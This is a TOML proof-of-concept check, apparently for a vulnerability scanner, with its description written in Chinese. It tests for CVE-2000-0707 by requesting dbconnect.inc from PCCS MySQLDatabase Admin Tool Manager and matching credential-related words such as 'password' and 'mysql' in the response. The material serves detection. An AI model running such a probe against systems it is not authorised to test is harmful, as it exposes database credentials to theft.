[info]
author = "AVE"
description = "检测 PCCS MySQLDatabase Admin Tool Manager 的 dbconnect.inc 文件是否可被未授权访问，该文件包含数据库连接凭据。"
id = "POC-AVE-2000-0863"
name = "PCCS MySQLDatabase Admin Tool Manager 信息泄露 PoC"
severity = "high"
tags = [
    "cve-2000-0707",
    "information-disclosure",
    "pccs",
]
vuln_id = [
    "CVE-2000-0707",
    "AVE-2000-0863",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/dbconnect.inc"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "password",
    "user",
    "mysql",
    "dbconnect",
]
